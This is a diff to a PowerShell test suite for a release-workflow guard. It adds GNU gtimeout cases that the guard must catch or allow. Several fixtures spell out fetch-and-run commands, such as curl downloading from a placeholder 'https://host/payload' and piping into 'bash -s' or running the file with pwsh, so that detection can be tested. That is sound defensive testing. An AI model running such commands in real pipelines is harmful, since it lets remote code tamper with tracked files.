@@ -692,6 +692,18 @@ fi
         @{ Name = 'env option separator hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | env -- bash -s"; Shell = 'bash' },
         @{ Name = 'env split-string hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | env -S 'bash -s'"; Shell = 'bash' },
         @{ Name = 'timeout wrapper hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | timeout 2 bash -s"; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout hides root Bash stdin writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | gtimeout -- 1 bash -s"; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout hides nested Bash stdin writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | gtimeout -- 1 bash -s"; Shell = 'bash' },
+        @{ Name = 'absolute GNU gtimeout hides Bash stdin execution'; Text = 'printf x | /opt/homebrew/bin/gtimeout -- 1 /bin/bash -s'; Shell = 'bash' },
+        @{ Name = 'qualified GNU gtimeout hides Bash stdin execution'; Text = 'printf x | ./tools/bin/gtimeout -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'quoted Windows GNU gtimeout executable hides Bash stdin execution'; Text = 'printf x | ''C:\Program Files\Git\usr\bin\gtimeout.exe'' -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout consumes separate kill and signal values'; Text = 'printf x | gtimeout -k 1 -s TERM -- 2 bash -s'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout consumes attached kill and signal values'; Text = 'printf x | gtimeout -k1 -sTERM -- 2 bash -s'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout consumes equals kill and signal values'; Text = 'printf x | gtimeout --kill-after=1 --signal=TERM 2 bash -s'; Shell = 'bash' },
+        @{ Name = 'env separator wraps qualified GNU gtimeout'; Text = 'printf x | env -u SAFE_VALUE -- /usr/local/bin/gtimeout --signal TERM -- 1 /bin/bash -s'; Shell = 'bash' },
+        @{ Name = 'env split-string wraps GNU gtimeout options'; Text = "printf x | env -S 'gtimeout --kill-after=1 -- 2 bash -s'"; Shell = 'bash' },
+        @{ Name = 'exec argv-zero wraps GNU gtimeout'; Text = 'printf x | exec -a alias gtimeout -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'GNU time output option wraps GNU gtimeout'; Text = ('printf x | time -o "' + $workflowRunnerTemp + '/timing.txt" /opt/homebrew/bin/gtimeout -- 1 bash -s'); Shell = 'bash' },
         @{ Name = 'timeout end-of-options hides root Bash stdin writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | timeout -- 1 bash -s"; Shell = 'bash' },
         @{ Name = 'timeout end-of-options hides nested Bash stdin writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | timeout -- 1 bash -s"; Shell = 'bash' },
         @{ Name = 'timeout end-of-options with duration forms hides Bash stdin'; Text = 'printf x | timeout -- 1.5s bash -s'; Shell = 'bash' },
@@ -707,6 +719,9 @@ fi
         @{ Name = 'exec argv-zero wraps timeout end-of-options and Bash stdin'; Text = 'printf x | exec -a alias timeout -- 1 bash -s'; Shell = 'bash' },
         @{ Name = 'GNU time output option wraps timeout end-of-options and Bash stdin'; Text = ('printf x | time -o "' + $workflowRunnerTemp + '/timing.txt" timeout -- 1 bash -s'); Shell = 'bash' },
         @{ Name = 'timeout end-of-options hides downloaded Bash script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
+        @{ Name = 'GNU gtimeout runs a downloaded Bash script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; gtimeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
+        @{ Name = 'qualified GNU gtimeout runs a downloaded Bash script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; env -u SAFE_VALUE -- /opt/homebrew/bin/gtimeout --kill-after=1 --signal TERM -- 2 bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
+        @{ Name = 'GNU gtimeout runs a downloaded PowerShell script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite-source.ps1" https://host/payload; gtimeout -- 1 pwsh -File "' + $workflowRunnerTemp + '/rewrite-source.ps1"'); Shell = 'bash' },
         @{ Name = 'timeout end-of-options hides downloaded PowerShell script'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\rewrite-source.ps1"; timeout -- 1 pwsh -File "' + $workflowRunnerTemp + '\rewrite-source.ps1"'); Shell = 'pwsh' },
         @{ Name = 'wrapper chain and option arguments hide Bash stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | env -u SAFE_VALUE -- timeout --signal=TERM 2 bash -s"; Shell = 'bash' },
         @{ Name = 'env split-string wraps timeout and Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | env -S 'timeout 2 bash -s'"; Shell = 'bash' },
@@ -793,7 +808,9 @@ fi
     $safeTimeoutCases = @(
         @{ Name = 'timeout end-of-options preserves a tracked PowerShell script'; Text = 'timeout -- 1 pwsh -File ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
         @{ Name = 'timeout option values preserve a tracked Bash script'; Text = 'timeout -k 1 -- 2 bash ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
-        @{ Name = 'timeout end-of-options preserves ordinary runner-temp output'; Text = ('timeout -- 1 printf payload > "' + $workflowRunnerTemp + '/timeout-output.txt"'); Shell = 'bash' }
+        @{ Name = 'timeout end-of-options preserves ordinary runner-temp output'; Text = ('timeout -- 1 printf payload > "' + $workflowRunnerTemp + '/timeout-output.txt"'); Shell = 'bash' },
+        @{ Name = 'GNU gtimeout preserves a tracked PowerShell script'; Text = '/opt/homebrew/bin/gtimeout -k 1 -- 2 pwsh -File ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout preserves ordinary runner-temp output'; Text = ('gtimeout -- 1 printf payload > "' + $workflowRunnerTemp + '/gtimeout-output.txt"'); Shell = 'bash' }
     )
     foreach ($case in $safeTimeoutCases) {
         $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell })
@@ -808,7 +825,12 @@ fi
         @{ Name = 'timeout required option value is an option terminator'; Text = 'timeout -k -- 1 bash -s'; Shell = 'bash' },
         @{ Name = 'timeout required long option value is empty'; Text = 'timeout --kill-after= -- 1 bash -s'; Shell = 'bash' },
         @{ Name = 'timeout duration after terminator looks like an option'; Text = 'timeout -- -- 1 bash -s'; Shell = 'bash' },
-        @{ Name = 'timeout unknown option fails closed'; Text = 'timeout --unknown-option 1 bash -s'; Shell = 'bash' }
+        @{ Name = 'timeout unknown option fails closed'; Text = 'timeout --unknown-option 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout end-of-options without a duration'; Text = 'gtimeout --'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout duration without a command'; Text = 'gtimeout -- 1'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout required short option value is missing'; Text = 'gtimeout -k -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout required long option value is empty'; Text = 'gtimeout --signal= -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'GNU gtimeout unknown option fails closed'; Text = 'gtimeout --unknown-option 1 bash -s'; Shell = 'bash' }
     )
     foreach ($case in $incompleteTimeoutCases) {
         foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
@@ -844,6 +866,10 @@ fi
         @{ Name = 'downloaded executable writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/rewrite"; "' + $workflowRunnerTemp + '/rewrite" src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'bash' },
         @{ Name = 'timeout end-of-options runs downloaded script that writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md'); Shell = 'bash' },
         @{ Name = 'timeout end-of-options runs downloaded script that writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'bash' },
+        @{ Name = 'GNU gtimeout runs downloaded script that writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; gtimeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md'); Shell = 'bash' },
+        @{ Name = 'GNU gtimeout runs downloaded script that writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; gtimeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'bash' },
+        @{ Name = 'qualified GNU gtimeout runs downloaded script that writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; /opt/homebrew/bin/gtimeout -k 1 -s TERM -- 2 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md'); Shell = 'bash' },
+        @{ Name = 'qualified GNU gtimeout runs downloaded script that writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; env -S ''/usr/local/bin/gtimeout --kill-after=1 -- 2 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md'''); Shell = 'bash' },
         @{ Name = 'downloaded PowerShell executable writes tracked root'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP\rewrite.exe"; & "$env:RUNNER_TEMP\rewrite.exe" CHANGELOG.md'; Shell = 'pwsh' },
         @{ Name = 'downloaded PowerShell executable writes nested tracked source'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP\rewrite.exe"; & "$env:RUNNER_TEMP\rewrite.exe" src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
         @{ Name = 'downloaded executable writes tracked root after runner-temp directory change'; Text = 'curl --output "$RUNNER_TEMP/rewrite" https://host/payload; chmod +x "$RUNNER_TEMP/rewrite"; cd "$RUNNER_TEMP"; ./rewrite CHANGELOG.md'; Shell = 'bash' },
@@ -903,6 +929,13 @@ fi
     $timeoutActionRestoreResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'timeout-wrapped-action-restore.yml'; Text = $timeoutActionRestoreFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('timeout-wrapped-action-restore.yml/future-consumer'))
     if ($timeoutActionRestoreResult.Count -ne 1 -or $timeoutActionRestoreResult[0].Scripts -notcontains $script) {
         throw 'A clean unconditional root action checkout must restore tracked bytes after a timeout-wrapped downloaded writer.'
+    }
+
+    $gtimeoutActionRestoreWriter = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; gtimeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md')
+    $gtimeoutActionRestoreFixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $gtimeoutActionRestoreWriter -WriteText 'printf payload' -Shell 'bash' -Position 'after artifact download' -IncludeShellCheckout
+    $gtimeoutActionRestoreResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'gtimeout-action-restore.yml'; Text = $gtimeoutActionRestoreFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('gtimeout-action-restore.yml/future-consumer'))
+    if ($gtimeoutActionRestoreResult.Count -ne 1 -or $gtimeoutActionRestoreResult[0].Scripts -notcontains $script) {
+        throw 'A clean unconditional root action checkout must restore tracked bytes after a GNU gtimeout-wrapped downloaded writer.'
     }
 
     $directExecutableLinkCases = @(
